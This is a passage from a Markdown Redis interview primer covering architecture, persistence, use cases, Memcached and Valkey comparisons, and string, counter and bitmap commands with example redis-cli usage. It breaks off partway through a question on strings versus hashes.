---
type: interview-prep
---

# Redis Interview Primer — 332 Questions

Comprehensive Q+A primer for Redis / in-memory-store interviews. A Databases-category companion to the Postgres, Cassandra, and DB Theory primers — the in-memory data-structure store that powers caches, sessions, rate limiters, leaderboards, and queues. Covers the architecture & single-threaded model, all the data types, keys/expiration/eviction, persistence, pub/sub & streams, transactions & Lua, caching patterns, distributed locks, rate limiting, replication, Sentinel & Cluster, memory, operations & security, the 7.x/Valkey ecosystem, and design playbooks.

Each answer is interview-shaped: opinionated, concrete, real Redis commands and Lua, latency/memory internals, failure modes, and the caching/locking anti-patterns that sink real systems. Current Redis (7.x — Functions, ACLs, RESP3, Stack modules); Valkey fork noted; contrasts with Memcached where it clarifies.

1. [[#Redis Fundamentals & Architecture]]
2. [[#Strings, Numbers & Bitmaps]]
3. [[#Hashes & Lists]]
4. [[#Sets & Sorted Sets]]
5. [[#Advanced Types: Streams, HyperLogLog & Geo]]
6. [[#Keys, Expiration & Eviction]]
7. [[#Persistence: RDB & AOF]]
8. [[#The Single-Threaded Model & Performance]]
9. [[#Pub/Sub & Keyspace Notifications]]
10. [[#Transactions & Optimistic Locking]]
11. [[#Lua Scripting & Functions]]
12. [[#Caching Patterns]]
13. [[#Distributed Locks]]
14. [[#Rate Limiting, Sessions & Common Patterns]]
15. [[#Replication]]
16. [[#High Availability: Sentinel]]
17. [[#Redis Cluster]]
18. [[#Memory Management & Optimization]]
19. [[#Operations, Monitoring & Security]]
20. [[#Redis 7.x, Ecosystem & Alternatives]]
21. [[#Scenario & Playbooks]]

---

## Redis Fundamentals & Architecture

### Summary

**What this topic covers**

The ground floor of Redis: what it actually *is*, why it's fast, and the mental model that makes every later topic make sense. The name is **REmote DIctionary Server**, and the load-bearing word is *dictionary* — Redis is an **in-memory key–value data-structure server**, not merely a KV cache. Its values are rich data structures (strings, hashes, lists, sets, sorted sets, streams, bitmaps, HyperLogLogs, geo) that the server manipulates *server-side* with atomic operations. The 16 questions here cover the single-threaded command model and why it makes commands atomic (and O(N) commands dangerous), why everything-in-RAM plus mostly-O(1) ops plus the RESP protocol makes Redis fast, the client-server model, optional persistence (RDB/AOF — dispelling "Redis loses data"), the canonical use cases and the crucial **when NOT to use Redis**, and how Redis sits *next to* Memcached and a relational database rather than replacing either.

**Mental model**

Think of Redis as a giant hash map that lives in RAM on a server, that many clients talk to over the network, and that ships with a library of specialized data structures baked into the server. You don't fetch a blob and manipulate it in your app — you send a command like `ZADD leaderboard 100 alice` and the *server* mutates the sorted set for you, atomically, in microseconds. Because a single thread executes commands one at a time on an event loop, you never reason about locks between commands: each command is atomic by construction. That same single thread is the sharpest edge — one slow O(N) command (`KEYS *`, `SMEMBERS` on a million-element set) blocks *every other client* until it finishes. So the whole art of Redis is: keep operations small and O(1)-ish, keep the working set in RAM, and lean on the rich types so the server does the work near the data instead of shuffling bytes to the client.

**Key terms**

- **Data-structure server** — Redis stores typed values (not opaque blobs) and exposes server-side operations on them.
- **In-memory** — the dataset lives in RAM; disk is only for persistence, not for serving reads.
- **Single-threaded (command execution)** — one command runs at a time on an event loop; Redis 6+ adds I/O threads for network parsing only.
- **RESP** — REdis Serialization Protocol, the simple request/response wire format (RESP2/RESP3).
- **RDB** — point-in-time snapshot persistence (a compact dump file).
- **AOF** — Append-Only File; a log of write commands replayed on restart.
- **Keyspace** — the flat namespace of all keys in a database.
- **Logical databases** — 16 numbered namespaces (`SELECT 0..15`); discouraged in modern practice.
- **Atomic command** — a single command that fully completes with no interleaving.
- **Valkey** — the Linux-Foundation open-source fork created after Redis's 2024 licence change.
- **Memcached** — a simpler, multi-threaded, pure in-memory cache with no rich types or persistence.

**Why interviewers ask this**

This topic is the tell for whether you *understand* Redis or just *use* it. A junior says "Redis is a cache." A senior says "Redis is a single-threaded, in-memory data-structure server; the single thread is why my commands are atomic and why one `KEYS *` can tank p99 for everyone." Interviewers probe: is it really single-threaded (yes, for command execution)? Does in-memory mean you lose data on restart (no — RDB/AOF)? When would you *not* reach for Redis (data bigger than RAM, ad-hoc analytical queries, systems needing hard transactional durability)? Getting these right signals you'll make sound design calls; getting them wrong signals you'll treat Redis as a magic box and be surprised when it bites.

**Common confusions**

- "Redis is just a faster Memcached" — it has rich types, persistence, replication, scripting, pub/sub, and streams; Memcached has none of these.
- "Single-threaded means slow" — the opposite: no lock contention, no context-switching, and RAM speed make it handle 100k+ ops/sec on one core.
- "In-memory means it loses everything on crash" — RDB snapshots and the AOF log provide configurable durability.
- "Redis can replace my database" — only when the whole dataset fits in RAM and you don't need complex queries/joins or strong durability; usually it complements a primary DB.
- "The 16 databases are like schemas, use them freely" — they share one thread and one memory pool; prefer key prefixes or separate instances.

**What follows from this topic**

Everything. The rich types get their own topics — **Strings, Numbers & Bitmaps** and **Hashes & Lists** come next, then sets, sorted sets, and streams. The single-threaded model underpins the atomicity you'll exploit in transactions, Lua scripting, distributed locks, and rate limiters. Persistence (RDB/AOF), eviction, replication, Sentinel and Cluster all build on the "in-memory, optionally durable, single-node-then-sharded" picture sketched here. Nail this and the rest is detail; stay fuzzy here and the sharp bits (O(N) latency, eviction vs expiry, replication loss windows) will feel like arbitrary trivia instead of consequences.

### Q1. What is Redis, in one sentence, and why is "data-structure server" the important part?

Redis (REmote DIctionary Server) is an **in-memory key–value data-structure server**: a networked service that stores keys mapping to rich, typed values and exposes atomic, server-side operations on those values.

The load-bearing phrase is **data-structure server**, not "cache". A plain cache (or Memcached) stores an opaque blob per key — to change one field you fetch the whole blob, deserialize, mutate, reserialize, and write it back. Redis stores the *structure itself*: a hash, a list, a sorted set. You mutate it in place with a command:

```bash
HSET user:123 name alice age 30
HINCRBY user:123 age 1        # increment one field, server-side, atomic
ZADD leaderboard 100 alice    # add to a sorted set, kept ordered by score
ZINCRBY leaderboard 5 alice   # bump a score without reading it first
```

That's the whole philosophy: move the operation to the data instead of the data to the operation. It eliminates read-modify-write races and network round-trips, and it's why Redis is used for far more than caching — leaderboards, queues, rate limiters, pub/sub, streams.

### Q2. Is Redis really single-threaded? Explain the execution model.

Yes — **command execution is single-threaded**. One thread runs an event loop (epoll/kqueue) and processes commands one at a time, to completion, before starting the next.

Two consequences fall straight out of this:

1. **Every command is atomic.** There's no interleaving between two commands, so `INCR`, `LPUSH`, `ZADD` etc. are atomic without any locking on your part. This is why Redis is such a good primitive for counters, locks, and queues.
2. **One slow command blocks everyone.** Because there's a single execution thread, an O(N) command over a huge key (`KEYS *`, `SMEMBERS bigset`, `SORT`) stalls *all* other clients until it returns. This is the number-one Redis latency footgun.

Nuance: Redis 6+ added **I/O threads** that parallelize reading/writing bytes on the socket and RESP parsing — but the *command itself* still runs on the single main thread. So "single-threaded" remains the correct mental model for reasoning about atomicity and latency.

### Q3. Why is Redis so fast?

Several factors compound:

- **Everything is in RAM.** No disk seeks on the read path; RAM access is ~100ns vs milliseconds for disk.
- **Most operations are O(1)** — `GET`, `SET`, `HGET`, `LPUSH`, `SADD` are constant time. You pay only for what you touch.
- **No lock contention.** Single-threaded execution means no mutexes, no context switching between competing threads, no cache-line ping-pong.
- **Efficient protocol (RESP).** A simple, binary-safe request/response format that's cheap to parse.
- **An epoll/kqueue event loop** multiplexes thousands of connections on one thread without a thread-per-connection cost.
- **Optimized C, compact encodings.** Small aggregates use memory-efficient representations (listpack, intset) that also stay CPU-cache-friendly.

The upshot: a single Redis core routinely serves 100k+ simple ops/sec with sub-millisecond latency. The catch is that this all depends on commands staying small and O(1)-ish.

### Q4. What is the RESP protocol, and what changed in RESP3?

**RESP** (REdis Serialization Protocol) is Redis's wire format: a simple, human-readable, binary-safe request/response protocol over TCP. Clients send an array of bulk strings (the command and its args); the server replies with a typed value prefixed by a single byte (`+` simple string, `-` error, `:` integer, `$` bulk string, `*` array).

```bash
# Wire form of: SET foo bar
*3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n
```

It's request/response, but it supports **pipelining**: a client can fire many commands without waiting for each reply, then read all replies at once — amortizing network round-trip time (huge for bulk work).

**RESP3** (Redis 6) adds richer reply types — maps, sets, doubles, booleans, big numbers, and out-of-band **push** messages (used for client-side caching invalidations and keyspace notifications). RESP2 could only express arrays, so a `HGETALL` came back as a flat array; RESP3 returns a proper map. Clients negotiate RESP3 with `HELLO 3`. RESP2 remains the default for backward compatibility.

### Q5. Does Redis persist data, or do I lose everything on restart?

You do **not** have to lose data. "In-memory" describes where Redis *serves* data from, not whether it's durable. Redis offers two persistence mechanisms (usable together):

| | RDB (snapshot) | AOF (append-only file) |
|---|---|---|
| What | Point-in-time binary dump | Log of every write command |
| Durability | Can lose data since last snapshot | Configurable: `everysec` (default), `always`, `no` |
| Restart speed | Fast (load compact dump) | Slower (replay the log) |
| Cost | `fork()` + copy-on-write child; fork pause on big datasets | Rewrite/compaction; larger files |

Defaults on many builds enable both. RDB gives you fast restarts and compact backups; AOF gives you a smaller data-loss window. So the honest statement is: **Redis is durable to the degree you configure it**, trading fsync frequency against write latency. The persistence topic goes deeper on the fork/COW mechanics and the AOF rewrite.

### Q6. What are the canonical use cases for Redis?

- **Caching** — the #1 use; cache-aside in front of a slow database.
- **Session store** — fast, TTL-based user sessions shared across app servers.
- **Rate limiting** — atomic `INCR` + `EXPIRE`, or sliding windows with sorted sets.
- **Leaderboards / ranking** — sorted sets keep members ordered by score, O(log N).
- **Queues / job processing** — lists (`LPUSH`/`BRPOP`) or streams with consumer groups.
- **Pub/Sub & real-time messaging** — fan-out events to subscribers.
- **Real-time analytics & counters** — page views, DAU via bitmaps/HyperLogLog.
- **Distributed locks** — `SET key token NX PX ttl`.
- **Geospatial** — nearby-search with geo commands.

The through-line: anything that's hot, small enough to fit in RAM, and benefits from atomic, low-latency operations.

### Q7. When should you NOT use Redis?

Redis is a specialized tool, not a universal database. Avoid it (or don't rely on it alone) when:

- **Your data doesn't fit in RAM.** Redis keeps the whole working set in memory; a 2TB dataset on a 64GB box is a non-starter (RAM is expensive relative to disk).
- **You need complex, ad-hoc queries or joins.** Redis has no query planner — you can only look things up by the access patterns you designed keys for. Relational analytics belong in SQL.
- **You need strong transactional durability / ACID.** `MULTI`/`EXEC` has no rollback, and replication is async (a failover can lose recent writes). For money-movement systems of record, use a real transactional DB.
- **You need durable, guaranteed delivery messaging at scale** — Kafka is a better fit than Redis pub/sub (though Streams narrow the gap).

Rule of thumb: Redis is a brilliant *accelerator and coordination layer*, a poor *system of record* for large or query-heavy data.

### Q8. How does Redis compare to Memcached?

| | Redis | Memcached |
|---|---|---|
| Data types | Rich (string, hash, list, set, ZSET, stream…) | Strings/blobs only |
| Threading | Single-threaded exec (I/O threads in 6+) | Multi-threaded |
| Persistence | RDB + AOF | None |
| Replication / HA | Yes (Sentinel, Cluster) | No (client-side only) |
| Scripting | Lua, Functions | No |
| Pub/Sub, streams | Yes | No |
| Best at | Rich caching + data structures + coordination | Simple, high-throughput pure cache |

Memcached can edge Redis on pure multi-core throughput for dead-simple get/set caching because it's multi-threaded. But the moment you want atomic counters, structured values, persistence, or replication, Redis wins decisively. In 2026 most teams default to Redis (or Valkey) unless they have a narrow, proven pure-cache need.

### Q9. Can Redis replace my relational database?

Almost never as a wholesale replacement — think **complementary, not competing**. A relational DB is your durable system of record with joins, transactions, secondary indexes, and ad-hoc queries over data that may vastly exceed RAM. Redis is the fast layer in front of and alongside it.

A typical architecture: Postgres holds the authoritative data; Redis caches hot reads (cache-aside), holds sessions, powers a leaderboard, and rate-limits the API. If Redis dies, the system is slower but still correct because Postgres is the source of truth.

You *can* run Redis as a primary store for specific workloads (ephemeral session data, a real-time leaderboard) where the data is small, the access patterns are simple, and you've configured AOF for durability. But replacing a transactional relational DB for your core business data is the wrong tool.

### Q10. What is the keyspace, and how do you inspect it?

The **keyspace** is the flat namespace of all keys in a Redis database. Keys are binary-safe strings; there's no enforced hierarchy, so teams simulate one with colon-delimited prefixes: `user:123:profile`, `session:abc`, `cache:page:home`.

Inspect it with `redis-cli`:

```bash
redis-cli
> DBSIZE                  # number of keys
> TYPE user:123           # the value's type (string/hash/list/...)
> TTL session:abc         # seconds to live, or -1 (no expiry) / -2 (missing)
> EXISTS user:123
> OBJECT ENCODING user:123  # internal representation (embstr, listpack, ...)
> SCAN 0 MATCH user:* COUNT 100   # cursor-based, non-blocking iteration
```

Critically, use **`SCAN`, never `KEYS *`, in production** — `KEYS` scans the entire keyspace in one blocking O(N) sweep and stalls the single thread; `SCAN` iterates incrementally with a cursor.

### Q11. What are Redis's 16 logical databases, and should you use them?

A single Redis instance exposes **16 numbered logical databases** (0–15 by default), selected per-connection with `SELECT`:

```bash
SELECT 0        # default
SET foo bar
SELECT 1        # a separate keyspace; foo doesn't exist here
```

They give you isolated keyspaces on one instance — handy for, say, separating cache from sessions in a dev box.

In practice they're **discouraged**:

- All databases **share the same single thread and memory pool**, so they don't isolate performance or capacity — a slow command in DB 3 still blocks DB 0.
- Redis Cluster supports only DB 0, so using multiple DBs blocks you from sharding later.
- Many client libraries and tools assume DB 0.

Prefer **key prefixes** within DB 0, or **separate Redis instances** when you need real isolation.

### Q12. Why are single Redis commands atomic, and how do you build bigger atomic operations?

Single commands are atomic **because of the single-threaded execution model** — one command runs to completion before the next starts, so there's no interleaving and no partial state visible to other clients. `INCR`, `SETNX`, `LPUSH`, `ZADD`, `GETSET` are each indivisible.

For operations that span *multiple* commands, single-command atomicity isn't enough — another client can slip a command in between yours. Redis gives you three tools:

- **`MULTI`/`EXEC`** — queue several commands and execute them as one atomic batch (no other command interleaves), optionally with `WATCH` for optimistic locking. Note: no rollback on a runtime error.
- **Lua scripts (`EVAL`/`EVALSHA`)** — run arbitrary multi-step logic atomically; the whole script executes on the single thread with nothing interleaved.
- **Functions (Redis 7)** — server-stored scripts, same atomic guarantee.

The pattern "read a value, decide, write it back atomically" (the heart of locks and rate limiters) is exactly what Lua/`MULTI` exist for.

### Q13. What's the core tradeoff of an in-memory design?

**Speed versus capacity and cost.** Keeping the entire working set in RAM is what makes Redis microsecond-fast — but RAM is far more expensive and far smaller than disk. A commodity server has terabytes of SSD but perhaps tens to a few hundred GB of RAM.

The consequences you design around:

- **Sizing is bounded by RAM.** Your dataset (plus per-key overhead, replication buffers, and fragmentation) must fit; when it can't, you shard (Cluster) or evict.
- **Eviction under pressure.** With `maxmemory` set, Redis evicts keys by policy (`allkeys-lru`, `allkeys-lfu`, etc.) rather than crashing — fine for a cache, dangerous if you treated it as a store.
- **Cost per byte is high**, so Redis is for hot, high-value data, not cold archives.

Memcached shares this tradeoff; disk-backed databases invert it (cheap capacity, slower access). Choosing Redis is choosing to pay for RAM to buy latency.

### Q14. What is Valkey, and why does it exist?

**Valkey** is an open-source fork of Redis, stewarded by the **Linux Foundation**, created in 2024 after Redis Inc. changed the Redis licence away from the permissive open-source BSD to source-available licences (RSALv2 / SSPL).

The practical points for an interview:

- Valkey forked from the last BSD-licensed Redis (7.2.4) and stays API/protocol-compatible, so it's a near drop-in replacement.
- Major cloud providers (AWS, Google, Oracle) and the community backed Valkey to keep a truly open-source line.
- For most applications the two are interchangeable today; the divergence is licensing and governance, not fundamentals.

Knowing this signals you track the ecosystem. When someone says "Redis" in 2026, they may well be running Valkey — the concepts in this primer apply to both.

### Q15. How do you connect to Redis and run commands with redis-cli?

`redis-cli` is the built-in interactive client:

```bash
redis-cli -h localhost -p 6379            # connect
redis-cli -h localhost -p 6379 -a secret  # with a password (prefer REDISCLI_AUTH env var)

127.0.0.1:6379> PING
PONG
127.0.0.1:6379> SET greeting "hello"
OK
127.0.0.1:6379> GET greeting
"hello"
```

Useful non-interactive and diagnostic modes:

```bash
redis-cli SET foo bar          # one-shot command
redis-cli --scan --pattern 'user:*'   # safe iteration (uses SCAN)
redis-cli --latency            # measure round-trip latency
redis-cli MONITOR              # stream live commands (debug only — costly)
redis-cli INFO memory          # server memory stats
```

Security note: never expose Redis to the public internet, and prefer `requirepass`/ACLs and TLS. `MONITOR` and `KEYS *` are debugging tools that hurt a busy production server — reach for `SCAN` and `INFO` instead.

### Q16. Is Redis a single node, or is it distributed?

Redis starts as a **single node** — one process, one dataset in RAM, one thread executing commands. That's the default and it's remarkably capable (100k+ ops/sec, tens of GB).

You scale it in two orthogonal directions, each with its own topic later:

- **Replication + high availability.** A primary asynchronously replicates to one or more replicas (for read scaling and failover). **Sentinel** monitors the primary and promotes a replica automatically if it fails — this keeps a *single logical dataset* highly available, but doesn't shard it.
- **Horizontal sharding (Redis Cluster).** The keyspace is split across **16384 hash slots** distributed over multiple primaries, each with replicas. This lets the dataset exceed a single machine's RAM, at the cost of multi-key operations needing to land in one slot (via **hash tags** `{...}`) and clients handling MOVED/ASK redirects.

So: single-node by default, and distributed via replication (availability) and Cluster (capacity) when you outgrow one box.

## Strings, Numbers & Bitmaps

### Summary

**What this topic covers**

The **string** — Redis's fundamental and most versatile type — and two power-tools built on top of it: **atomic numeric counters** and **bitmaps**. A Redis string is a binary-safe byte sequence up to 512MB that can hold text, a serialized JSON document, an image, or a number. The 16 questions here work through the core string commands (`SET`/`GET`/`MSET`/`APPEND`/`GETRANGE`…), the rich `SET` option flags (`EX`/`PX`/`NX`/`XX`/`GET`/`KEEPTTL`) that make `SET` a Swiss-army knife for caching and locking, the killer feature of **atomic increments** (`INCR`/`INCRBY`/`INCRBYFLOAT`) for counters and IDs, **bitmaps** (`SETBIT`/`BITCOUNT`/`BITOP`) for absurdly memory-efficient boolean tracking, and **bitfields** (`BITFIELD`) for packing many small integers into one string. Along the way: storing JSON in a string vs RedisJSON, the 512MB limit, and how `OBJECT ENCODING` reveals whether a string is stored as an `int`, `embstr`, or `raw`.

**Mental model**

A Redis string is "a bag of bytes with a length" — that single abstraction is reinterpreted three ways. As **text/blob**, it's your cache entry, session token, or serialized object. As a **number**, Redis parses the ASCII digits on the fly so `INCR` can atomically add one — the value is still a string internally, just interpreted as an integer. As a **bitmap**, the same bytes are addressed one *bit* at a time, so 1 million users' daily-active flags fit in 125KB (1 bit each). The important instinct: strings aren't only for caching JSON. When you catch yourself doing "read value, add one, write it back," stop — that's a race, and `INCR` already does it atomically server-side. When you're tracking a yes/no fact for millions of IDs, don't store a set of IDs; set a bit.

**Key terms**

- **String** — the fundamental Redis value: binary-safe bytes, max 512MB.
- **Binary-safe** — can contain any byte including nulls; not just UTF-8 text.
- **`SET` options** — `EX`/`PX`/`EXAT` (TTL), `NX`/`XX` (conditional), `GET` (return old), `KEEPTTL`.
- **`SETEX` / `SETNX`** — legacy shortcuts for set-with-expiry and set-if-not-exists.
- **Atomic counter** — `INCR`/`DECR`/`INCRBY`/`INCRBYFLOAT`, race-free increments.
- **Bitmap** — a string addressed as an array of bits (`SETBIT`/`GETBIT`/`BITCOUNT`).
- **`BITOP`** — bitwise AND/OR/XOR/NOT across bitmaps (e.g. retention = AND of two days).
- **Bitfield** — `BITFIELD`, packs multiple small ints into one string with overflow control.
- **`OBJECT ENCODING`** — reveals the internal string representation: `int`, `embstr`, `raw`.
- **`APPEND`** — append bytes to a string, growing it in place.
- **512MB limit** — the hard maximum size of a single string value.

**Why interviewers ask this**

Strings look trivial, so the interview signal is whether you know the *non-trivial* parts. Anyone can `SET`/`GET`. The senior signals are: reaching for `INCR` instead of a read-modify-write loop (understanding atomicity), knowing `SET key val NX PX 30000` is the one-shot atomic lock primitive (and why the old `SETNX` + separate `EXPIRE` is a bug — non-atomic, can leak a lock forever if the client dies between them), and knowing bitmaps exist for memory-efficient analytics. Interviewers use this topic to test whether you exploit Redis's atomicity and its memory model, or whether you'd naively serialize everything to JSON strings and hammer the server with round-trips.

**Common confusions**

- "To increment a counter I read it, add one, and write it back" — that's a race across clients; use atomic `INCR`.
- "Numbers are a separate type" — no, they're strings Redis parses as integers/floats on demand.
- "`SETNX` then `EXPIRE` is how you make a lock" — not atomic; if the client crashes between the two commands the key never expires. Use `SET k v NX PX ttl`.
- "A bitmap is a special type" — it's just a string you address bit-by-bit.
- "Store everything as JSON strings" — fine for whole-object caching, but you lose field-level access and atomic field updates; consider a hash or RedisJSON.
- "Strings are small" — they can be up to 512MB; a giant string is a big-key latency risk.

**What follows from this topic**

Strings are the substrate everything else contrasts against. The very next topic, **Hashes & Lists**, opens by asking when a hash beats many separate string keys for an object. The atomic-counter idea here is the seed of rate limiting (fixed-window `INCR`+`EXPIRE`) covered later. The `SET … NX PX` primitive is the foundation of the distributed-locks topic. TTLs introduced here connect to the expiration-and-eviction topic. And the "JSON-in-a-string vs a richer type" question recurs whenever you design a schema in a schemaless store.

### Q1. Why is the string the most fundamental and versatile Redis type?

Because a Redis string is simply a **binary-safe sequence of bytes** (up to 512MB), it can represent almost anything: plain text, a number, a serialized JSON or protobuf object, an HTML fragment, even a small image or file. Every other type is, in a sense, specialized machinery layered on this byte-bag idea.

Its versatility shows in the three faces it wears:

```bash
SET greeting "hello world"        # text
SET counter 0                     # a number (still stored as a string)
SET user:123 '{"name":"alice"}'   # a serialized JSON document
SETBIT active:2026-07-01 42 1     # a bitmap (bytes addressed as bits)
```

"Binary-safe" is key: Redis never interprets the bytes as UTF-8 or truncates at a null byte, so you can store arbitrary binary payloads. This is why so many Redis patterns — caching, counters, locks, feature flags, bitmap analytics — are all "just strings" under the hood.

### Q2. Walk through the core string commands.

The essentials:

```bash
SET user:1 alice            # set a value (overwrites)
GET user:1                  # -> "alice"
MSET a 1 b 2 c 3            # set many keys in one atomic call
MGET a b c                  # -> ["1","2","3"], one round-trip
APPEND log "line1\n"        # append bytes, returns new length
STRLEN user:1               # -> 5
GETRANGE user:1 0 2         # substring by byte index -> "ali"
SETRANGE user:1 0 "A"       # overwrite bytes from an offset
GETSET counter 0            # set new value, return the old one (atomic)
```

`MSET`/`MGET` matter for performance: they batch N operations into one round-trip, turning N network latencies into one. `GETSET` (or `SET … GET` in modern Redis) atomically swaps a value and returns the previous one — useful for "reset this counter and read what it was" patterns. `APPEND` lets you build a value incrementally (e.g. accumulating a log), though watch for it growing into a big key.

### Q3. What do the SET options (EX, PX, NX, XX, GET, KEEPTTL) do?

Modern `SET` absorbs what used to need separate commands, via option flags:

```bash
SET session:abc token EX 3600      # expire in 3600 seconds
SET session:abc token PX 500       # expire in 500 milliseconds
SET session:abc token EXAT 1893456000  # expire at a Unix timestamp
SET lock:job token NX PX 30000     # set only if absent, 30s TTL (a lock!)
SET config:x newval XX             # set only if the key already exists
SET counter 0 GET                  # set and return the previous value
SET user:1 alice KEEPTTL           # overwrite value but keep existing TTL
```

- **`EX`/`PX`/`EXAT`/`PXAT`** — set a TTL in seconds/millis, or an absolute expiry.
- **`NX`** — only set if the key does *not* exist (create-only).
- **`XX`** — only set if the key *does* exist (update-only).
- **`GET`** — return the old value atomically (like `GETSET`).
- **`KEEPTTL`** — retain the current TTL instead of clearing it on overwrite.

The combination `SET k v NX PX ttl` is the canonical one-command atomic lock acquisition — value + conditional + expiry in a single atomic step.

### Q4. What's the difference between SETEX, SETNX, and SET with options?

`SETEX` and `SETNX` are **older, narrower shortcuts** that predate `SET`'s option flags:

```bash
SETEX session:abc 3600 token   # == SET session:abc token EX 3600
SETNX lock:job token           # == SET lock:job token NX  (no TTL!)
```

`SETEX` sets a value with an expiry. `SETNX` sets only if the key is absent — but crucially it **takes no TTL**. Historically people paired it with a separate `EXPIRE`:

```bash
SETNX lock:job token    # step 1
EXPIRE lock:job 30      # step 2 — BUG: not atomic with step 1
```

If the client crashes between the two commands, the lock has no expiry and is held **forever** (deadlock). That's exactly why modern code uses the single atomic `SET lock:job token NX PX 30000`. Treat `SETEX`/`SETNX` as legacy; prefer `SET` with options.

### Q5. Why are atomic counters (INCR/DECR/INCRBY) a killer feature?

Because they eliminate a class of bug: the **read-modify-write race**. Two clients that each `GET counter → 5`, add one, and `SET counter 6` produce 6, not 7 — a lost update. `INCR` does the whole thing atomically on the server:

```bash
INCR page:views:home        # 1, 2, 3... atomic across all clients
INCRBY downloads 5          # add 5 atomically
DECR stock:item42           # decrement
INCRBYFLOAT wallet:1 12.50  # atomic float increment
```

If the key doesn't exist, `INCR` treats it as 0 and sets it to 1 — so you don't even initialize counters. No locks, no transactions, no round-trip to read-then-write. This makes Redis the natural home for page-view counters, download tallies, rate-limit windows, and monotonic ID generation. It's a direct payoff of the single-threaded execution model: the increment can't interleave with anything.

### Q6. How does INCR work if numbers are "just strings"?

Redis has no separate integer type — the value stays a string, and `INCR` **parses the stored bytes as a base-10 integer, adds one, and writes the result back as a string**, all atomically. So `SET n 10` then `INCR n` reads `"10"`, computes 11, stores `"11"`.

```bash
SET n 10
INCR n        # -> 11
OBJECT ENCODING n   # -> "int"  (Redis stores small integers efficiently)
SET x "hello"
INCR x        # -> error: value is not an integer or out of range
```

Two consequences:

- If the string isn't a valid integer (`"hello"`, or a float for `INCR`), Redis returns an error rather than guessing.
- Redis optimizes storage: a string that's a small integer uses the compact `int` encoding (a shared object for 0–9999), which is why counters are memory-cheap. `INCRBYFLOAT` handles decimals but the value then encodes as a normal string.

### Q7. What are bitmaps, and why are they so memory-efficient?

A **bitmap** isn't a separate type — it's a **string addressed one bit at a time**. `SETBIT key offset 0|1` sets the bit at a given position; the string grows to hold it. This lets you track a boolean fact for a huge population using **1 bit per item**:

```bash
SETBIT active:2026-07-01 123 1   # user 123 was active today
GETBIT active:2026-07-01 123     # -> 1
BITCOUNT active:2026-07-01       # how many distinct active users
BITPOS active:2026-07-01 1       # position of first set bit
```

The efficiency is dramatic: tracking daily-active status for **1 million users takes ~125KB** (1,000,000 bits / 8), versus storing a set of user IDs which might be tens of MB. Common uses: daily/monthly active users, feature-flag membership, online-presence, "has user seen X" flags. The trick works because user IDs map directly to bit offsets, so the key *is* the answer to "who did this today?" in a fixed, tiny footprint.

### Q8. How would you use BITOP for retention analytics?

`BITOP` performs **bitwise operations across bitmaps** — AND, OR, XOR, NOT — writing the result to a destination key. This turns set-algebra questions into single commands.

Given a daily-active bitmap per day (bit = user active), you can compute retention (users active on *both* days) with an AND:

```bash
# users active on day 1 AND day 2 = retained users
BITOP AND retained:d1_d2 active:2026-07-01 active:2026-07-02
BITCOUNT retained:d1_d2          # count of retained users

# users active on EITHER day (reach)
BITOP OR reach active:2026-07-01 active:2026-07-02
BITCOUNT reach
```

- **AND** → retention / "did both".
- **OR** → total reach / "did either".
- **XOR** → churn+new / "did exactly one".

This is enormously cheaper than pulling user sets into your app and intersecting them. Caveat: `BITOP` and `BITCOUNT` over very large bitmaps are O(N) in the byte length, so on huge bitmaps they can be a latency concern on the single thread — run them off-peak or on a replica.

### Q9. What is BITFIELD and when would you use it?

`BITFIELD` treats a string as a packed array of **arbitrary-width integers**, letting you get/set/increment small numbers at bit offsets — atomically, with overflow control. It's like a struct-of-tiny-ints stored in one key.

```bash
# store two unsigned 8-bit counters packed into one string
BITFIELD stats:1 SET u8 0 100 SET u8 8 50
BITFIELD stats:1 GET u8 0 GET u8 8      # -> [100, 50]
BITFIELD stats:1 INCRBY u8 0 10          # bump the first counter
BITFIELD stats:1 OVERFLOW SAT INCRBY u8 0 200   # saturate instead of wrapping
```

Use it when you have many small numeric fields for an entity and want to pack them densely — e.g. per-user small counters, quota buckets, or fixed-size numeric records — saving huge amounts of memory versus a key per field. `OVERFLOW WRAP|SAT|FAIL` controls what happens on overflow (wrap around, clamp to max, or reject). It's a niche but powerful tool when memory density matters.

### Q10. Should you store JSON as a string? What are the limits vs RedisJSON?

Storing JSON as a plain string is common and fine for **whole-object, read-mostly caching**:

```bash
SET user:123 '{"name":"alice","age":30,"prefs":{...}}'
GET user:123     # fetch, then parse in your app
```

Its limits:

- **No field-level access.** To read or change `age`, you fetch the whole document, parse, mutate, and write it all back — wasteful for big docs and a read-modify-write race for concurrent updates.
- **No server-side queries** over the JSON's contents.

Alternatives:

- A **hash** (`HSET user:123 name alice age 30`) gives field-level get/set and atomic `HINCRBY` on a field — better when you update individual fields.
- **RedisJSON** (a Redis Stack module) stores JSON as a native type with path-based get/set (`JSON.SET user:123 $.age 31`), array/object operations, and (with RediSearch) indexing/querying.

Rule: JSON-string for cache-the-whole-blob simplicity; hash for field updates; RedisJSON when you need path queries or partial updates on nested documents.

### Q11. What is the 512MB string limit and why does it matter?

A single Redis string value can be at most **512MB**. That's a hard limit for one key's value (and by extension a bitmap, since bitmaps are strings — the max addressable bit is 2^32 − 1).

Why it matters in practice, well before you hit 512MB:

- **Big keys are latency bombs.** Operations on a multi-megabyte value take real CPU time on the single thread, blocking every other client. `APPEND`-ing into an ever-growing log string, or caching huge blobs, silently creates a big key.
- **Memory spikes.** Overwriting or copying a large value transiently doubles its memory; replication and RDB fork amplify this.
- **Network cost.** `GET` on a 100MB string ships 100MB per call.

Guidance: keep individual values small (kilobytes, not megabytes). If you're storing something large, chunk it across keys, use a more appropriate type (a list/stream for append-heavy data), or store the blob in object storage and keep only a pointer in Redis.

### Q12. What does OBJECT ENCODING tell you about a string?

`OBJECT ENCODING key` reveals the **internal representation** Redis chose for a string, which affects memory and CPU:

```bash
SET a 123
OBJECT ENCODING a      # -> "int"     (an integer, stored compactly / shared)
SET b "hello"
OBJECT ENCODING b      # -> "embstr"  (short string, <=44 bytes, one allocation)
SET c "a very long string that exceeds forty-four bytes in length......"
OBJECT ENCODING c      # -> "raw"     (longer string, separate allocation)
```

- **`int`** — the string is a small integer; Redis stores it as a native long, and integers 0–9999 are shared objects (near-zero cost). This is why counters are cheap.
- **`embstr`** — short strings (≤44 bytes) are stored embedded with their metadata in a single allocation, which is cache-friendly and fast to create.
- **`raw`** — longer strings get a separate heap allocation.

Knowing this helps you reason about memory: a million small integer counters cost far less than a million long JSON blobs. `OBJECT ENCODING` is a go-to when diagnosing why a keyspace uses more memory than expected.

### Q13. When is a string the right type versus a hash?

Choose based on your **access granularity**:

